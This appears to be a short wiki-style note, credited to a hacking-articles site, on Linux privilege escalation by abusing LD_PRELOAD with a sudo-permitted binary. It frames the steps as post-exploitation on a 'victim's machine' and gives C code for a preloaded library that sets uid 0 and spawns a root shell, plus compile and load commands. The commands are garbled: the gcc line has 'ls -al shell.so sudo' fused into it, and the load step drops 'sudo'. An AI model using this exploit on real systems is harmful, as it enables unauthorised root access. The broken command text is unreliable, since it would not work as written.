LD_PRELOAD is an environment variable that lists shared libraries with functions that override the standard set, just as /etc/ld.so.preload does. These are implemented by the loader /lib/ld-linux.so

[[Linux Privilege Escalation]] via LD_PRELOAD consists of abusing the Linux preloading functionality by loading a binary that can be run by root, even though we're not, thus escalating our privilege to root.

To exploit such type of vulnerability we need to compromise victim’s machine at once then move to privilege escalation phase. Suppose you successfully login into victim’s machine through ssh now for post exploitation type **sudo -l**

Let’s generate a C-program file inside /tmp directory for example.

```c
#include <stdio.h> 
#include <sys/types.h> 
#include <stdlib.h> 

void _init() 
     { unsetenv("LD_PRELOAD"); 
       setgid(0); 
       setuid(0); 
       system("/bin/sh"); 
    }
```
Let's compile the c program as follow:

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles ls -al shell.so sudo 
```
... and load the c program:
```bash
LD_PRELOAD=/tmp/shell.so find 
```
then check if we are be given the root privilege as follow:
```bash
id 
whoami
```
Source: https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/

